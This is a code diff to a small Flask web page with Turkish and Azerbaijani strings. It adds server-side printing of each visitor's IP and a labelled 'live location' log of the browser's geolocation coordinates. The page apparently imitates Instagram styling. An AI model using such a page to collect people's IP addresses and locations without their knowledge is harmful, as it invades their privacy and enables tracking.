@@ -1,5 +1,5 @@
 from flask import Flask, request
-import os
+import datetime
 
 app = Flask(__name__)
 
@@ -7,6 +7,8 @@ app = Flask(__name__)
 def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     
+    print(f"[{datetime.datetime.now()}] Ziyaretci IP: {ip}")
+
     return f"""
     <!DOCTYPE html>
     <html>
@@ -17,7 +19,7 @@ def index():
             body {{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}}
             .container {{background:white;padding:40px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.2);text-align:center;max-width:500px;width:100%;}}
             button, input {{width:100%;padding:16px;margin:10px 0;border-radius:8px;}}
-            button {{background:linear-gradient(45deg,#E1306C,#F77737);color:white;border:none;font-size:18px;cursor:pointer;}}
+            button {{background:linear-gradient(45deg,#E1306C,#F77737);color:white;border:none;font-size:18px;}}
         </style>
     </head>
     <body>
@@ -37,7 +39,12 @@ def index():
             function getLocation() {{
                 if (navigator.geolocation) {{
                     navigator.geolocation.getCurrentPosition(
-                        pos => alert("✅ Koordinat: " + pos.coords.latitude + ", " + pos.coords.longitude),
+                        pos => {{
+                            const lat = pos.coords.latitude.toFixed(6);
+                            const lon = pos.coords.longitude.toFixed(6);
+                            alert("✅ Koordinat: " + lat + ", " + lon);
+                            console.log("CANLI KONUM → Lat:", lat, "Lon:", lon);
+                        }},
                         err => alert("❌ İcazə vermədiniz")
                     );
                 }}
